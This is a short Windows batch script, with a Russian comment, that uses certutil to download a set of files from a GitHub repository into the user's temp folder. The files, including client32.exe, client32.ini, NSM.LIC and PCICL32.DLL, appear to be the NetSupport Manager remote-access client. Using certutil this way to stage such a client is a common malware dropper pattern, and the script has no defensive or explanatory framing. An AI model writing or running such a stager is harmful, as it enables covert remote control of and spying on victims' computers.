set TEMP=%USERPROFILE%\AppData\Local\Temp

:: Скачивание файлов с помощью certutil
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/client32.exe" "%TEMP%\client32.exe"
certutil -urlcache -split -f "https://raw.githubusercontent.com/MEMEOW-IO/test/refs/heads/main/client32.ini" "%TEMP%\client32.ini"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.LIC" "%TEMP%\NSM.LIC"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/HTCTL32.DLL" "%TEMP%\HTCTL32.DLL"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/msvcr100.dll" "%TEMP%\msvcr100.dll"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nskbfltr.inf" "%TEMP%\nskbfltr.inf"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.ini" "%TEMP%\NSM.ini"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nsm_vpro.inf" "%TEMP%\nsm_vpro.inf"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/AudioCapture.dll" "%TEMP%\AudioCapture.dll"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/pcicapi.dll" "%TEMP%\pcicapi.dll"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICHEK.DLL" "%TEMP%\PCICHEK.DLL"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICL32.DLL" "%TEMP%\PCICL32.DLL"
certutil -urlcache -split -f "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/TCCTL32.DLL" "%TEMP%\TCCTL32.DLL"
